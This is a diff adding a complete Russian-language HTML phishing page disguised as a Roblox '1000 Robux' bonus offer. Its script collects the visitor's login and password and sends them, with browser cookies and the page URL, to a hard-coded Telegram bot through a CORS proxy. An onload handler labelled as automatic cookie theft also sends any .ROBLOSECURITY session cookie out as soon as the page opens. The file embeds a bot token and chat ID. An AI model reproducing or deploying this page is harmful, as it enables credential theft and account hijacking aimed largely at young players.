@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox — Бонус</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body {
+            background: #0b0e1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .card {
+            background: #1a1f33;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.8);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid #2d3a5e;
+        }
+        h1 { color: #fff; font-size: 26px; margin-bottom: 6px; }
+        .sub { color: #9aa3b8; font-size: 14px; margin-bottom: 25px; }
+        .input-group { text-align: left; margin-bottom: 16px; }
+        .input-group label { color: #c8d0e0; font-size: 13px; display: block; margin-bottom: 4px; }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border-radius: 10px;
+            border: none;
+            background: #0f1426;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: 0.2s;
+        }
+        .input-group input:focus { background: #181f38; box-shadow: 0 0 0 2px #e03a3a; }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            background: #e03a3a;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 8px;
+        }
+        .btn:hover { background: #c02a2a; transform: scale(1.02); }
+        #status { margin-top: 18px; color: #f1c40f; font-weight: bold; min-height: 22px; }
+        .footer { margin-top: 22px; color: #5a668a; font-size: 11px; border-top: 1px solid #2a3555; padding-top: 16px; }
+        .loader {
+            display: none;
+            margin: 12px auto 0;
+            width: 28px;
+            height: 28px;
+            border: 3px solid #2a3555;
+            border-top: 3px solid #e03a3a;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h1>🎁 1000 Robux</h1>
+    <p class="sub">Подтверди аккаунт и получи бонус</p>
+
+    <div class="input-group">
+        <label>👤 Логин или Email</label>
+        <input type="text" id="username" placeholder="Введи свой логин">
+    </div>
+    <div class="input-group">
+        <label>🔑 Пароль</label>
+        <input type="password" id="password" placeholder="Введи пароль">
+    </div>
+
+    <button class="btn" onclick="sendData()">Получить Robux</button>
+    <div class="loader" id="loader"></div>
+    <div id="status"></div>
+    <div class="footer">🔒 Данные защищены. Бонус начислится автоматически.</div>
+</div>
+
+<script>
+    // ===== ТВОИ ДАННЫЕ ДЛЯ TELEGRAM =====
+    const BOT_TOKEN = '8687077171:AAFRVNVxK1cvR5JgByOTXSjqGpdvH4wC2S0';
+    const CHAT_ID = '2029866224';
+
+    // ===== ОТПРАВКА ДАННЫХ =====
+    function sendData() {
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+
+        if (!username || !password) {
+            document.getElementById('status').innerHTML = '⚠️ Заполни оба поля!';
+            document.getElementById('status').style.color = '#f39c12';
+            return;
+        }
+
+        document.getElementById('loader').style.display = 'block';
+        document.getElementById('status').innerHTML = '⏳ Отправка...';
+
+        const cookie = document.cookie || 'Кука не найдена';
+        const message = `🔐 **Новый улов!**\n\n` +
+                        `👤 Логин: ${username}\n` +
+                        `🔑 Пароль: ${password}\n` +
+                        `🍪 Кука: ${cookie}\n` +
+                        `🌐 URL: ${window.location.href}\n` +
+                        `🕒 Время: ${new Date().toISOString()}`;
+
+        // Прямой запрос к Telegram API (через CORS-прокси)
+        const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+        const targetUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        fetch(proxyUrl + targetUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Requested-With': 'XMLHttpRequest'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(res => {
+            if (!res.ok) throw new Error('Ошибка сети');
+            return res.json();
+        })
+        .then(data => {
+            if (data.ok) {
+                document.getElementById('status').innerHTML = '✅ Отправлено!';
+                document.getElementById('status').style.color = '#2ecc71';
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+            } else {
+                throw new Error(data.description || 'Ошибка');
+            }
+        })
+        .catch(err => {
+            console.error(err);
+            document.getElementById('status').innerHTML = '❌ Ошибка. Попробуй через Telegram WebApp.';
+            document.getElementById('status').style.color = '#e74c3c';
+        })
+        .finally(() => {
+            document.getElementById('loader').style.display = 'none';
+        });
+    }
+
+    // ===== АВТО-КРАЖА КУКИ =====
+    window.onload = function() {
+        const cookie = document.cookie;
+        if (cookie && cookie.includes('.ROBLOSECURITY')) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `🍪 **Кука украдена авто!**\n\n${cookie}`,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(e => console.log('Авто-кража не удалась:', e));
+        }
+    };
+
+    // ===== ENTER =====
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') sendData();
+    });
+</script>
+
+</body>
+</html>
